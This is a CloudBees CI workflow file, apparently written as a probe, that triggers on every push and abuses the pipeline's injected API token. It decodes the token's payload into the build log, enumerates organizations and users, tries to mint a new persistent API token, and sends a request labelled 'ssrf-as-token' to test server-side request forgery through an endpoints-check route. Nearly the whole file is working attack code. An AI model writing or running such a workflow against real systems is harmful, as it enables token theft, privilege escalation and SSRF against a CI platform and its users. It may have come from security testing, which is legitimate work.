apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: probe11

on:
  push:
    branches:
      - "**"

permissions:
  scm-token-own: read
  id-token: write

jobs:
  tok:
    steps:
      - name: probe-token-scope
        uses: docker://alpine:3.20
        env:
          CBTOK: ${{ cloudbees.api.token }}
          CBURL: ${{ cloudbees.api.url }}
        run: |
          apk add --no-cache curl >/dev/null 2>&1
          echo "url=$CBURL tokenlen=${#CBTOK}"
          echo "== payload"; echo "$CBTOK" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 800; echo
          echo "== orgs"; curl -s -m 10 -H "Authorization: Bearer $CBTOK" "$CBURL/v1/organizations" | head -c 300; echo
          echo "== users"; curl -s -m 10 -H "Authorization: Bearer $CBTOK" "$CBURL/v1/users" | head -c 300; echo
          echo "== api-tokens"; curl -s -m 10 -X POST -H "Authorization: Bearer $CBTOK" -H 'content-type: application/json' -d '{"name":"probe-pat"}' "$CBURL/v1/api-tokens" | head -c 300; echo
          echo "== ssrf-as-token"; curl -s -m 10 -X POST -H "Authorization: Bearer $CBTOK" -H 'content-type: application/json' -d '{"resourceId":"9c7b76c3-bb23-4283-8f98-1bbf051dacf7","provider":"gitlab-server","url":"http://example.com","username":"u","password":"p"}' "$CBURL/v1/resources/9c7b76c3-bb23-4283-8f98-1bbf051dacf7/endpoints-check" | head -c 200; echo
